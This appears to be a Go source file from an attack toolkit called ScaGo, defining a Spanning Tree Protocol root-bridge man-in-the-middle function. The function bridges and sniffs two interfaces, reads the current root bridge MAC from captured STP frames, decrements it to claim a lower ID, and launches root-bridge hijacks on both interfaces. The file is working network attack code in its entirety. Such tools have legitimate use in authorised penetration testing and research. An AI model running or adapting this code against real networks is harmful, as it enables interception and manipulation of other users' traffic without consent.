package higherlevel

import (
	"fmt"
	"github.com/tiagomdiogo/ScaGo/sniffer"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"strconv"
	"strings"
)

func StpRootBridgeMitM2(iface1, iface2 string) {
	running := 0
	go sniffer.BridgeAndSniff(iface1, iface2)

	for {
		if running == 0 {
			pkt := communication.Recv(iface1)
			stpLayer := utils.GetSTPLayer(pkt)
			if stpLayer == nil {
				continue
			}

			rootString := stpLayer.RouteID.HwAddr.String()
			rootStringAux := strings.ReplaceAll(rootString, ":", "")
			rootInt, _ := strconv.ParseInt(rootStringAux, 16, 64)
			rootInt -= 1
			rootMacHex := fmt.Sprintf("%012x", rootInt)
			parts := make([]string, 0, 6)
			for i := 0; i < len(rootMacHex); i += 2 {
				parts = append(parts, rootMacHex[i:i+2])
			}
			rootMac := strings.Join(parts, ":")

			params := map[string]interface{}{
				"rootmac":   rootMac,
				"bridgemac": rootMac,
				"rootid":    stpLayer.RouteID.SysID,
				"bridgeid":  stpLayer.RouteID.SysID,
			}
			go stpRootBridgeHijack(iface1, params)
			go stpRootBridgeHijack(iface2, params)
			running = 1
		}
	}
}
